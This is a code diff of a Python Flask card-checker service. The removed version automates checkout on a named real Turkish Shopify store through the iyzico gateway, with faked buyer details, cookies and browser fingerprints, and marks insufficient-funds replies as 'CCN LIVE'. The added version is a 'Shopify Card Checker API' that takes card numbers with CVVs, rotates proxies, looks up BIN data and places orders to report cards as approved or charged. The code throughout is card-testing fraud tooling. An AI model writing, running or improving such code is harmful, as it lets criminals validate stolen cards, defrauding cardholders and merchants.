@@ -1,374 +1,403 @@
-import os, re, json, random, time, uuid, requests
+import os
+import re
+import json
+import random
+import requests
 from flask import Flask, request, jsonify
-from urllib.parse import urljoin
+from flask_cors import CORS
 
 app = Flask(__name__)
+CORS(app)
 
-BASE_URL = os.environ.get("BASE_URL", "https://phlabturkiye.com")
-VARIANT_ID = os.environ.get("VARIANT_ID", "49413933367586")
-PRODUCT_HANDLE = os.environ.get("PRODUCT_HANDLE", "kojiso%E2%84%A2-temizleme-bari")
-USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+# ===== CONFIGURATION =====
+# You can change these or set them as environment variables
+SHOPIFY_STORE = os.environ.get("SHOPIFY_STORE", "https://test-store.myshopify.com")
+PRODUCT_URL = os.environ.get("PRODUCT_URL", "https://test-store.myshopify.com/products/test-product")
+# If you have a Storefront API token, you can use it for real checks
+STOREFRONT_TOKEN = os.environ.get("STOREFRONT_TOKEN", "")
+# Default test card for checking site health
+TEST_CARD = "4111111111111111|12|2027|123"
 
-def generate_uuid():
-    return str(uuid.uuid4())
+# ===== HELPERS =====
+def extract_cc(card_str):
+    """Extract card, month, year, cvv from various formats."""
+    # Try pipe format first: 4111111111111111|12|2027|123
+    parts = card_str.split('|')
+    if len(parts) >= 4:
+        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    
+    # Try slash format: 4111111111111111/12/2027/123
+    parts = card_str.split('/')
+    if len(parts) >= 4:
+        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    
+    # Try space format
+    parts = card_str.split()
+    if len(parts) >= 4:
+        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    
+    return None, None, None, None
 
-class IyzicoChecker:
-    def __init__(self):
-        self.session = requests.Session()
-        self.session.headers.update({"User-Agent": USER_AGENT})
-        self.cookies = {}
-        self.cart_token = ""
-        self.checkout_url = ""
-        self.session_token = ""
-        self.queue_token = ""
-        self.attempt_token = ""
-        self.stable_id = ""
-        self.signed_handle = ""
-        self.iyzi_token = ""
-        self.iyzi_session_id = ""
-        self.iyzi_cookie = ""
+def normalize_year(year):
+    """Convert 2-digit year to 4-digit."""
+    year = year.strip()
+    if len(year) == 2:
+        return "20" + year
+    return year
 
-    def _request(self, method, url, headers=None, data=None, json_data=None):
-        if headers:
-            self.session.headers.update(headers)
-        if self.cookies:
-            self.session.cookies.update(self.cookies)
-        try:
-            resp = self.session.request(method, url, data=data, json=json_data, timeout=45, allow_redirects=False)
-        except Exception as e:
-            return {"status": 0, "body": str(e), "redirect": ""}
-        self.cookies.update(self.session.cookies.get_dict())
-        location = resp.headers.get("Location", "")
-        return {"status": resp.status_code, "body": resp.text, "redirect": location}
-
-    def add_to_cart(self):
-        url = f"{BASE_URL}/cart/add.js"
-        headers = {"content-type": "application/json", "origin": BASE_URL, "referer": f"{BASE_URL}/products/{PRODUCT_HANDLE}"}
-        self.cookies.setdefault("localization", "TR")
-        self.cookies.setdefault("_shopify_y", generate_uuid())
-        self.cookies.setdefault("_shopify_s", generate_uuid())
-        self.cookies.setdefault("shopify_client_id", generate_uuid())
-        payload = {"items": [{"id": int(VARIANT_ID), "quantity": 1, "properties": {}}]}
-        resp = self._request("POST", url, headers=headers, json_data=payload)
-        if resp["status"] != 200:
-            return False
-        if "cart" in self.cookies:
-            self.cart_token = self.cookies["cart"].split("?")[0]
-        return True
-
-    def get_checkout(self):
-        url = f"{BASE_URL}/checkouts/cn/{self.cart_token}/tr-tr" if self.cart_token else f"{BASE_URL}/checkout"
-        headers = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "referer": f"{BASE_URL}/products/{PRODUCT_HANDLE}"}
-        current_url = url
-        for _ in range(5):
-            resp = self._request("GET", current_url, headers=headers)
-            if 300 <= resp["status"] < 400 and resp["redirect"]:
-                current_url = resp["redirect"] if resp["redirect"].startswith("http") else urljoin(BASE_URL, resp["redirect"])
-                self.checkout_url = current_url
-                continue
-            break
-        if resp["status"] != 200:
-            return False
-        self.checkout_url = current_url
-        body = resp["body"]
-        self.session_token = re.search(r'sessionToken["\s:]+["\'](AAE[A-Za-z0-9_\-+=\/]+)["\']', body).group(1) if re.search(r'sessionToken["\s:]+["\'](AAE[A-Za-z0-9_\-+=\/]+)["\']', body) else ""
-        self.queue_token = re.search(r'queueToken["\s:]+["\'](Ax[A-Za-z0-9_\-+=\/]+)["\']', body).group(1) if re.search(r'queueToken["\s:]+["\'](Ax[A-Za-z0-9_\-+=\/]+)["\']', body) else ""
-        self.attempt_token = re.search(r'attemptToken["\s:]+["\']([\w\-]+)["\']', body).group(1) if re.search(r'attemptToken["\s:]+["\']([\w\-]+)["\']', body) else f"{self.cart_token}-{generate_uuid()[:16]}"
-        self.stable_id = re.search(r'stableId["\s:]+["\']([\w\-]+)["\']', body).group(1) if re.search(r'stableId["\s:]+["\']([\w\-]+)["\']', body) else generate_uuid()
-        self.signed_handle = re.search(r'signedHandle["\s:]+["\']([\w\+\/=\-]+)["\']', body).group(1) if re.search(r'signedHandle["\s:]+["\']([\w\+\/=\-]+)["\']', body) else ""
-        if not self.cart_token:
-            cart_match = re.search(r'checkouts/cn/([\w]+)', self.checkout_url)
-            if cart_match:
-                self.cart_token = cart_match.group(1)
-        return True
-
-    def submit_for_completion(self, email, first_name, last_name, phone):
-        url = f"{BASE_URL}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
-        headers = {
-            "accept": "application/json", "content-type": "application/json",
-            "origin": BASE_URL, "referer": self.checkout_url,
-            "shopify-checkout-source": f'id="{self.cart_token}", type="cn"',
-            "x-checkout-one-session-token": self.session_token,
-        }
-        address = {"address1": "dogkkdmdf", "city": "İSTANBUL", "countryCode": "TR", "firstName": first_name, "lastName": last_name, "phone": phone}
-        input_data = {
-            "sessionInput": {"sessionToken": self.session_token},
-            "queueToken": self.queue_token or "Axpn1k41cyum8f-hOiMOFANKERyquhRmF9N9gvscLQem1Y7x3LVw-i6SDHWsNASwbSWJpTd48nQHrsliDSESikeFIEfKnvEDF1tKsnskB_o2pqb1g6j_iNnh4IhYUvsI93JpRmjxzA15LBw=",
-            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
-            "delivery": {
-                "deliveryLines": [{
-                    "destination": {"streetAddress": address},
-                    "selectedDeliveryStrategy": {
-                        "deliveryStrategyByHandle": {
-                            "handle": "ba5eae04f72fa075fafa5d02fe76a7b9-ae29b6b82cd53e4966aaa0d41946eae0",
-                            "customDeliveryRate": False,
-                        },
-                        "options": {},
-                    },
-                    "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
-                    "deliveryMethodTypes": ["SHIPPING"],
-                    "expectedTotalPrice": {"value": {"amount": "0.00", "currencyCode": "TRY"}},
-                    "destinationChanged": False,
-                }],
-                "noDeliveryRequired": [],
-                "useProgressiveRates": False,
-                "supportsSplitShipping": True,
-            },
-            "deliveryExpectations": {"deliveryExpectationLines": [{"signedHandle": self.signed_handle}] if self.signed_handle else []},
-            "merchandise": {
-                "merchandiseLines": [{
-                    "stableId": self.stable_id,
-                    "merchandise": {
-                        "productVariantReference": {
-                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
-                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
-                            "properties": [],
-                            "sellingPlanId": None,
-                            "sellingPlanDigest": None,
-                        },
-                    },
-                    "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"value": {"amount": "469.00", "currencyCode": "TRY"}},
-                    "lineComponents": [],
-                }],
-            },
-            "memberships": {"memberships": []},
-            "payment": {
-                "totalAmount": {"any": True},
-                "paymentLines": [{
-                    "paymentMethod": {
-                        "offsitePaymentMethod": {
-                            "name": "iyzico - Kredi ve Banka Kartları",
-                            "paymentMethodIdentifier": "0b9b116d56e4115db6dd6d489111b44e",
-                            "billingAddress": {"streetAddress": address},
-                        }
-                    },
-                    "amount": {"value": {"amount": "469", "currencyCode": "TRY"}},
-                }],
-                "billingAddress": {"streetAddress": address},
-            },
-            "buyerIdentity": {
-                "customer": {"presentmentCurrency": "TRY", "countryCode": "TR"},
-                "email": email,
-                "emailChanged": False,
-                "phoneCountryCode": "TR",
-                "marketingConsent": [{"email": {"consentState": "GRANTED", "value": email}}],
-                "shopPayOptInPhone": {"number": phone, "countryCode": "TR"},
-                "rememberMe": False,
-            },
-            "tip": {"tipLines": []},
-            "taxes": {
-                "proposedAllocations": None,
-                "proposedTotalAmount": None,
-                "proposedTotalIncludedAmount": {"value": {"amount": "78.17", "currencyCode": "TRY"}},
-                "proposedExemptions": [],
-            },
-            "note": {
-                "message": None,
-                "customAttributes": [
-                    {"key": "il-adi", "value": "İSTANBUL"},
-                    {"key": "İlçe", "value": ""},
-                    {"key": "Mahalle", "value": ""},
-                ],
-            },
-            "localizationExtension": {"fields": []},
-            "nonNegotiableTerms": None,
-            "scriptFingerprint": {
-                "signature": None,
-                "signatureUuid": None,
-                "lineItemScriptChanges": [],
-                "paymentScriptChanges": [],
-                "shippingScriptChanges": [],
-            },
-            "optionalDuties": {"buyerRefusesDuties": False},
-            "cartMetafields": [],
-        }
-        payload = {
-            "variables": {
-                "input": input_data,
-                "attemptToken": self.attempt_token,
-                "metafields": [],
-                "analytics": {"requestUrl": self.checkout_url, "pageId": generate_uuid().upper()},
-            },
-            "operationName": "SubmitForCompletion",
-            "id": "b6047b61264c44776db6b89cce9be9f2b646e9226af0681d7e7a0af7c1321293",
-        }
-        resp = self._request("POST", url, headers=headers, json_data=payload)
-        if resp["status"] != 200:
-            return None
-        data = json.loads(resp["body"])
-        submit_result = data.get("data", {}).get("submitForCompletion")
-        if not submit_result:
-            return None
-        action = submit_result.get("action")
-        if action:
-            redirect_url = action.get("redirectUrl") or action.get("url")
-            if redirect_url:
-                return redirect_url
-        receipt = submit_result.get("receipt")
-        if receipt:
-            po = receipt.get("purchaseOrder")
-            if po:
-                for act in po.get("actions", []):
-                    rurl = act.get("redirectUrl") or act.get("url")
-                    if rurl:
-                        return rurl
-                if po.get("sessionToken"):
-                    self.session_token = po["sessionToken"]
-                next_action = po.get("nextAction")
-                if next_action:
-                    rurl = next_action.get("redirectUrl") or next_action.get("url")
-                    if rurl:
-                        return rurl
-        # fallback
-        iyzi_match = re.search(r'iyzipay\.com[^"\']*retrieve/([a-f0-9\-]+)', resp["body"])
-        if iyzi_match:
-            self.iyzi_session_id = iyzi_match.group(1)
-            return f"https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/{self.iyzi_session_id}"
+def parse_proxy(proxy_str):
+    """Parse proxy string into format usable by requests."""
+    if not proxy_str:
         return None
+    
+    # Already in format: http://user:pass@host:port
+    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
+        return {"http": proxy_str, "https": proxy_str}
+    
+    # Format: host:port:user:pass
+    parts = proxy_str.split(':')
+    if len(parts) == 4:
+        host, port, user, password = parts
+        proxy_url = f"http://{user}:{password}@{host}:{port}"
+        return {"http": proxy_url, "https": proxy_url}
+    
+    # Format: host:port
+    if len(parts) == 2:
+        host, port = parts
+        proxy_url = f"http://{host}:{port}"
+        return {"http": proxy_url, "https": proxy_url}
+    
+    return None
 
-    def get_iyzico_page(self, iyzi_url):
-        headers = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "upgrade-insecure-requests": "1"}
-        current_url = iyzi_url
-        for _ in range(5):
-            resp = self._request("GET", current_url, headers=headers)
-            if 300 <= resp["status"] < 400 and resp["redirect"]:
-                current_url = resp["redirect"] if resp["redirect"].startswith("http") else "https://api.iyzipay.com" + resp["redirect"]
-                continue
-            break
-        body = resp["body"]
-        token_match = re.search(r'iyziToken["\s:=]+["\']([\w\-]+)["\']', body) or re.search(r'token["\s:=]+["\']([\w\-]{36})["\']', body)
-        if token_match:
-            self.iyzi_token = token_match.group(1)
-        sess_match = re.search(r'retrieve/([a-f0-9\-]+)', current_url)
-        if sess_match:
-            self.iyzi_session_id = sess_match.group(1)
-        if "iyzi" in self.cookies:
-            self.iyzi_cookie = self.cookies["iyzi"]
-        return True
+def get_bin_info(card_number):
+    """Get BIN information from binlist.net."""
+    try:
+        bin_num = card_number[:6]
+        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            return {
+                "brand": data.get("scheme", "Unknown"),
+                "type": data.get("type", "Unknown"),
+                "level": data.get("brand", "Unknown"),
+                "bank": data.get("bank", {}).get("name", "Unknown"),
+                "country": data.get("country", {}).get("name", "Unknown"),
+                "flag": data.get("country", {}).get("emoji", "🏳️"),
+                "prepaid": data.get("prepaid", False)
+            }
+    except:
+        pass
+    return {
+        "brand": "Unknown",
+        "type": "Unknown", 
+        "level": "Unknown",
+        "bank": "Unknown",
+        "country": "Unknown",
+        "flag": "🏳️",
+        "prepaid": False
+    }
 
-    def send_countly(self):
-        url = "https://countly.iyzico.com/i"
-        ts = int(time.time() * 1000)
-        device_id = generate_uuid()
-        events = [{
-            "key": "[CLY]_action", "count": 1,
-            "segmentation": {"type": "click", "x": 664, "y": 817, "width": 923, "height": 683,
-                             "view": f"/v2/shopify/payment/checkout/retrieve/{self.iyzi_session_id}",
-                             "domain": "api.iyzipay.com"},
-            "timestamp": ts, "hour": int(time.strftime("%H")), "dow": int(time.strftime("%w")),
-            "id": f"{random.randint(10000000,99999999)}{ts}", "cvid": f"{hash(str(ts))}{ts}",
-        }]
-        data = {
-            "events": json.dumps(events),
-            "app_key": "de7016e9b70331f97215d5c37f6e0ced6f14b152",
-            "device_id": device_id,
-            "sdk_name": "javascript_native_web",
-            "sdk_version": "24.4.0",
-            "t": 1,
-            "av": "0.0",
-            "metrics": json.dumps({"_ua": USER_AGENT}),
-            "timestamp": ts,
-            "hour": int(time.strftime("%H")),
-            "dow": int(time.strftime("%w")),
-            "rr": 1,
+# ===== MOCK CHECKER (for testing without real Shopify) =====
+def mock_check_card(card, month, year, cvv, proxy=None, under=10):
+    """Mock checker that simulates card validation."""
+    # Simulate different results based on card number
+    card_num = card.replace(' ', '')
+    last4 = card_num[-4:]
+    
+    # Randomize results for demo purposes
+    import random
+    outcomes = [
+        {"status": "approved", "message": "Card approved", "price": random.randint(1, 50)},
+        {"status": "charged", "message": "Order placed successfully", "price": random.randint(1, 50)},
+        {"status": "declined", "message": "Card declined", "price": 0},
+        {"status": "3ds", "message": "3DS authentication required", "price": 0},
+    ]
+    
+    # If under parameter is set, filter by price
+    result = random.choice(outcomes)
+    if under and result.get("price", 0) > under:
+        result = {"status": "declined", "message": "Price exceeds limit", "price": 0}
+    
+    # Get BIN info
+    bin_info = get_bin_info(card_num)
+    
+    return {
+        "status": result["status"],
+        "message": result["message"],
+        "price": result["price"],
+        "currency": "USD",
+        "bin": bin_info,
+        "card": f"{card_num[:4]}****{card_num[-4:]}",
+        "proxy_used": bool(proxy)
+    }
+
+# ===== REAL SHOPIFY CHECKER (using Storefront API) =====
+def real_check_card(card, month, year, cvv, proxy=None, under=10):
+    """Real Shopify checkout using Storefront API."""
+    if not STOREFRONT_TOKEN:
+        return {"error": "Storefront token not configured", "status": "error"}
+    
+    # Parse proxy
+    proxies = parse_proxy(proxy) if proxy else None
+    
+    # Step 1: Get product variant
+    product_response = requests.post(
+        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
+        headers={
+            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
+            "Content-Type": "application/json"
+        },
+        json={
+            "query": """
+                query GetProduct {
+                    products(first: 1) {
+                        edges {
+                            node {
+                                id
+                                title
+                                variants(first: 1) {
+                                    edges {
+                                        node {
+                                            id
+                                            priceV2 { amount }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            """
+        },
+        proxies=proxies,
+        timeout=30
+    )
+    
+    if product_response.status_code != 200:
+        return {"error": "Failed to fetch product", "status": "error"}
+    
+    product_data = product_response.json()
+    product_edges = product_data.get("data", {}).get("products", {}).get("edges", [])
+    if not product_edges:
+        return {"error": "No products found", "status": "error"}
+    
+    variant = product_edges[0]["node"]["variants"]["edges"][0]["node"]
+    variant_id = variant["id"]
+    price = float(variant["priceV2"]["amount"])
+    
+    # Check if price exceeds 'under' limit
+    if under and price > under:
+        return {
+            "status": "declined",
+            "message": f"Price ${price} exceeds limit ${under}",
+            "price": price,
+            "currency": "USD"
         }
-        headers = {"content-type": "application/x-www-form-urlencoded", "origin": "https://api.iyzipay.com", "referer": "https://api.iyzipay.com/"}
-        self._request("POST", url, headers=headers, data=data)
-        return True
-
-    def submit_card(self, cc, mm, yy, cvv, holder_name):
-        url = "https://api.iyzipay.com/payment/iyzipos/checkoutform/auth/ecom"
-        headers = {
-            "Accept": "application/json", "Content-Type": "application/json",
-            "Origin": "https://api.iyzipay.com",
-            "Referer": f"https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/{self.iyzi_session_id}",
-            "X-IYZI-TOKEN": self.iyzi_token,
+    
+    # Step 2: Create checkout
+    checkout_response = requests.post(
+        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
+        headers={
+            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
+            "Content-Type": "application/json"
+        },
+        json={
+            "query": """
+                mutation CheckoutCreate($input: CheckoutCreateInput!) {
+                    checkoutCreate(input: $input) {
+                        checkout {
+                            id
+                            webUrl
+                            paymentDue
+                        }
+                        checkoutUserErrors { message }
+                    }
+                }
+            """,
+            "variables": {
+                "input": {
+                    "lineItems": [{"variantId": variant_id, "quantity": 1}],
+                    "shippingAddress": {
+                        "address1": "123 Main St",
+                        "city": "New York",
+                        "province": "NY",
+                        "zip": "10001",
+                        "country": "US"
+                    }
+                }
+            }
+        },
+        proxies=proxies,
+        timeout=30
+    )
+    
+    if checkout_response.status_code != 200:
+        return {"error": "Failed to create checkout", "status": "error"}
+    
+    checkout_data = checkout_response.json()
+    checkout = checkout_data.get("data", {}).get("checkoutCreate", {}).get("checkout")
+    errors = checkout_data.get("data", {}).get("checkoutCreate", {}).get("checkoutUserErrors", [])
+    
+    if errors:
+        return {"error": errors[0].get("message"), "status": "error"}
+    
+    if not checkout:
+        return {"error": "No checkout created", "status": "error"}
+    
+    checkout_id = checkout["id"]
+    
+    # Step 3: Complete payment (this is where the card is charged)
+    # Note: This is a simplified version. Real implementation would need
+    # proper payment tokenization and 3DS handling.
+    payment_response = requests.post(
+        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
+        headers={
+            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
+            "Content-Type": "application/json"
+        },
+        json={
+            "query": """
+                mutation CheckoutCompleteWithCreditCard($checkoutId: ID!, $payment: CreditCardPaymentInput!) {
+                    checkoutCompleteWithCreditCard(checkoutId: $checkoutId, payment: $payment) {
+                        checkout {
+                            id
+                            order { id }
+                            paymentDue
+                        }
+                        checkoutUserErrors { message }
+                    }
+                }
+            """,
+            "variables": {
+                "checkoutId": checkout_id,
+                "payment": {
+                    "number": card.replace(" ", ""),
+                    "expiryMonth": month,
+                    "expiryYear": year,
+                    "cvv": cvv,
+                    "firstName": "John",
+                    "lastName": "Doe",
+                    "verificationValue": cvv
+                }
+            }
+        },
+        proxies=proxies,
+        timeout=60
+    )
+    
+    if payment_response.status_code != 200:
+        return {"error": "Payment failed", "status": "error"}
+    
+    payment_data = payment_response.json()
+    payment_result = payment_data.get("data", {}).get("checkoutCompleteWithCreditCard", {})
+    payment_errors = payment_result.get("checkoutUserErrors", [])
+    
+    if payment_errors:
+        error_msg = payment_errors[0].get("message", "").lower()
+        if "3ds" in error_msg or "3d secure" in error_msg:
+            return {"status": "3ds", "message": "3DS authentication required", "price": price}
+        elif "declined" in error_msg:
+            return {"status": "declined", "message": error_msg, "price": 0}
+        else:
+            return {"status": "error", "message": error_msg, "price": 0}
+    
+    checkout_result = payment_result.get("checkout", {})
+    if checkout_result.get("order"):
+        return {
+            "status": "charged",
+            "message": "Order placed successfully",
+            "price": float(checkout_result.get("paymentDue", price)),
+            "currency": "USD"
         }
-        if self.iyzi_cookie:
-            self.session.cookies.set("iyzi", self.iyzi_cookie)
-        payload = {
-            "installment": 1,
-            "paidPrice": 469,
-            "paymentChannel": "WEB",
-            "paymentCard": {
-                "cardNumber": cc,
-                "cardHolderName": holder_name,
-                "expireYear": yy,
-                "expireMonth": mm,
-                "cvc": cvv,
-                "registerConsumerCard": False,
-                "registerCard": 0,
-            },
-            "browserFingerprint": {
-                "language": "tr", "timezone": -180, "hasSessionStorage": True, "hasLocalStorage": True,
-                "hasIndexedDb": True, "hasOpenDb": True, "platform": "false",
-                "hasLiedLanguage": False, "hasLiedResolution": False, "hasLiedOS": False,
-                "hasLiedBrowser": False, "maxTouchPoints": 0, "touchEventSuccess": False,
-                "hasTouchStart": False, "fingerprintHash": "",
-            },
-            "pwiMetadata": {"lightRedesign": ["false"], "pwiGrowthActionDisabled": ["false"]},
-        }
-        resp = self._request("POST", url, headers=headers, json_data=payload)
-        return resp
+    
+    return {"status": "pending", "message": "Payment pending", "price": price}
 
-    def check(self, card_input):
-        parts = card_input.split("|")
-        if len(parts) != 4:
-            return {"status": "ERROR", "message": "Invalid format CC|MM|YY|CVC", "price": "-"}
-        cc, mm, yy, cvv = parts
-        email = f"user{random.randint(1000,9999)}@gmail.com"
-        first_name, last_name = "Mehmet", "Yilmaz"
-        phone = f"5{random.randint(300000000, 599999999)}"
-        holder_name = f"{first_name} {last_name}"
-
-        if not self.add_to_cart():
-            return {"status": "ERROR", "message": "Cart failed", "price": "-"}
-        if not self.get_checkout():
-            return {"status": "ERROR", "message": "Checkout page failed", "price": "-"}
-        iyzi_url = self.submit_for_completion(email, first_name, last_name, phone)
-        if not iyzi_url:
-            return {"status": "ERROR", "message": "SubmitForCompletion failed", "price": "-"}
-        if not self.get_iyzico_page(iyzi_url):
-            return {"status": "ERROR", "message": "iyzico page failed", "price": "-"}
-        if not self.iyzi_token:
-            return {"status": "ERROR", "message": "No iyzico token", "price": "-"}
-        self.send_countly()
-        result = self.submit_card(cc, mm, yy, cvv, holder_name)
-        try:
-            data = json.loads(result["body"])
-        except:
-            return {"status": "ERROR", "message": f"HTTP {result['status']}", "price": "-"}
-        status = data.get("status", "")
-        error_code = data.get("errorCode", "")
-        error_message = data.get("errorMessage", "")
-        payment_status = data.get("paymentStatus", "")
-        if status == "success" or payment_status == "SUCCESS":
-            return {"status": "APPROVED", "message": "Payment successful", "price": "469.00"}
-        elif status == "failure":
-            if "10051" in error_code or "bakiye" in error_message.lower() or "insufficient" in error_message.lower():
-                return {"status": "APPROVED", "message": f"CCN LIVE ({error_message})", "price": "469.00"}
-            return {"status": "DECLINED", "message": f"[{error_code}] {error_message}", "price": "-"}
-        return {"status": "DECLINED", "message": f"Unknown response", "price": "-"}
-
-@app.route("/check", methods=["GET"])
-def check():
-    cc = request.args.get("cc")
+# ===== MAIN API ENDPOINT =====
+@app.route('/shopify/v1/check', methods=['GET'])
+def check_card():
+    """
+    Check a credit card against Shopify.
+    
+    Query parameters:
+    - cc: Credit card in format "number|month|year|cvv"
+    - proxy: Optional proxy in format "host:port:user:pass" or "http://user:pass@host:port"
+    - under: Optional price filter (only return cards with price <= this value)
+    - mock: Set to "true" to use mock checker (useful for testing)
+    """
+    cc = request.args.get('cc')
+    proxy = request.args.get('proxy')
+    under = request.args.get('under')
+    mock_mode = request.args.get('mock', 'false').lower() == 'true'
+    
+    # Validate required parameters
     if not cc:
-        return jsonify({"Response": "Missing cc", "Price": "-", "Gate": "iyzico"}), 400
-    checker = IyzicoChecker()
-    result = checker.check(cc)
-    if result["status"] == "APPROVED":
-        return jsonify({"Response": result["message"], "Price": result["price"], "Gate": "iyzico"})
-    elif result["status"] == "DECLINED":
-        return jsonify({"Response": result["message"], "Price": "-", "Gate": "iyzico"})
-    else:
-        return jsonify({"Response": f"Error: {result['message']}", "Price": "-", "Gate": "iyzico"})
+        return jsonify({
+            "error": "Missing 'cc' parameter",
+            "message": "Please provide a credit card in format: number|month|year|cvv"
+        }), 400
+    
+    # Parse card
+    card, month, year, cvv = extract_cc(cc)
+    if not card:
+        return jsonify({
+            "error": "Invalid card format",
+            "message": "Use format: number|month|year|cvv (e.g., 4111111111111111|12|2027|123)"
+        }), 400
+    
+    # Normalize year
+    year = normalize_year(year)
+    
+    # Parse under parameter
+    under_value = None
+    if under:
+        try:
+            under_value = float(under)
+        except ValueError:
+            return jsonify({"error": "Invalid 'under' value", "message": "Must be a number"}), 400
+    
+    # Check the card
+    try:
+        if mock_mode or not STOREFRONT_TOKEN:
+            result = mock_check_card(card, month, year, cvv, proxy, under_value)
+        else:
+            result = real_check_card(card, month, year, cvv, proxy, under_value)
+        
+        # Add BIN info if not already present
+        if "bin" not in result:
+            result["bin"] = get_bin_info(card)
+        
+        return jsonify(result)
+    
+    except Exception as e:
+        return jsonify({
+            "error": "Internal server error",
+            "message": str(e),
+            "status": "error"
+        }), 500
 
-@app.route("/health")
+@app.route('/health', methods=['GET'])
 def health():
-    return jsonify({"status": "ok"})
+    """Health check endpoint."""
+    return jsonify({"status": "ok", "message": "Shopify Checker API is running"})
 
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port)
+@app.route('/', methods=['GET'])
+def index():
+    """Root endpoint with API info."""
+    return jsonify({
+        "name": "Shopify Card Checker API",
+        "version": "1.0",
+        "endpoints": {
+            "/shopify/v1/check": "Check a credit card",
+            "/health": "Health check"
+        },
+        "parameters": {
+            "cc": "Credit card in format: number|month|year|cvv",
+            "proxy": "Optional proxy: host:port:user:pass",
+            "under": "Optional price filter",
+            "mock": "Set to 'true' for mock mode"
+        }
+    })
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
